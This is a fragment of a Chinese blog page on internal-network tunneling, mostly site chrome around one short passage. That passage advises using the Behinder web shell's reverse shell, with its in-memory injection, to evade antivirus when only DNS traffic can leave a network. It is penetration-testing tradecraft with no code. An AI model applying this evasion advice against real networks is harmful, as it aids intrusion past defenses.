class="line">2、速度是内网穿透的一个较为重要的指标，建议上线传输速度较快的极端网络条件下需要判断出网的必要性。</span><br><span class="line">    如；只有dns出网的情况下，我们需要考虑是否有必要配置复杂的穿透工具进行出网，因为dns的传输速率可能会让你崩溃，这种情况不如尝试一下冰蝎的反弹shell，因为其采用内存注入的形式进行上线，因为其可以天然的绕过一些不具备内存查杀能力的杀软。</span><br></pre></td></tr></table></figure>
+  </article>
+  <aside class="table-content" id="site-toc">
+  <div class="table-content-title">
+    <i class="fa fa-arrow-right fa-lg" id="site-toc-hide-btn"></i>
+    <span>目录</span>
+  </div>
+  <div class="table-content-main">
+    
+  </div>
+</aside>
+  
+    <aside class="passage-copyright">
+      <div>本文作者: hcncn</div>
+      
+        <div>
+          原文链接: 
+          <a href="" target="_blank">https://hcncn6.github.io/2022/09/05/内网/内网隧道/</a>
+        </div>
+      
+      <div>
+        版权声明: 本博客所有文章除特别声明外, 均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议. 转载请注明出处!
+      </div>
+    </aside>
+  
+  
+</div>
+
+    </main>
+    
+    <div class="site-footer-wrapper">
+  <footer class="site-footer">
+    
+    <div class="site-footer-info">
+      <i class="fa fa-clock-o"></i> 本站已稳定运行<span id="site-time"></span>
+    </div>
+    
+      <div class="site-footer-info">
+        <i class="fa fa-paw"></i> 您是本站第 <span id="site-count"></span> 位访客
+      </div>
+    
+    
+    <div class="site-footer-info">
+      <i class="fa fa-copyright"></i> 
+      2019 <a href="https://github.com/dongyuanxin/theme-ad/" target="_blank">Theme-AD</a>.
+      Created by <a href="https://godbmw.com/" target="_blank">GodBMW</a>.
+      All rights reserved.
+    </div>
+  </footer>
+</div>
+    <div id="site-layer" style="display:none;">
+  <div class="site-layer-content">
+    <div class="site-layer-header">
+      <span class="site-layer-header-title" id="site-layer-title"></span>
+      <i class="fa fa-close" id="site-layer-close"></i>
+    </div>
+    <div class="site-layer-body" id="site-layer-container">
+      <div class="site-layer-input" id="site-layer-search" style="display: none;">
+        <div class="site-layer-input-choose">
+          <a href="javascript:void(0);" title="Change Search Engine">Google</a>
+        </div>
+        <input type="text">
+        <i class="fa fa-search"></i>
+      </div>
+      
+      <div id="site-layer-welcome" style="display:none;"></div>
+    </div>
+  </div>
+</div>
+    
+
+<div class="bottom-bar">
+  <div class="bottom-bar-left">
+    <a href="/2022/09/05/内网/BloodHound/" data-enable="true">
+      <i class="fa fa-arrow-left"></i>
+    </a>
+    <a href="/2022/09/05/内网/横向移动/" data-enable="true">
+      <i class="fa fa-arrow-right"></i>
+    </a>
+  </div>
+  <div class="bottom-bar-right">
+    <a href="javascript:void(0);" data-enable="true" id="site-toc-show-btn">
+      <i class="fa fa-bars"></i>
+    </a>
+    
+    <a href="javascript:void(0);" id="site-toggle-share-btn">
+      <i class="fa fa-share-alt"></i>
+    </a>
+    
+    <a href="javascript:void(0);" id="back-top-btn">
+      <i class="fa fa-chevron-up"></i>
+    </a>
+  </div>
+</div>
+    <div id="share-btn">
+  
+  
+  
+  
+  
+</div>
+    
+
+
+
+
+
+    
+  </body>
+</html>
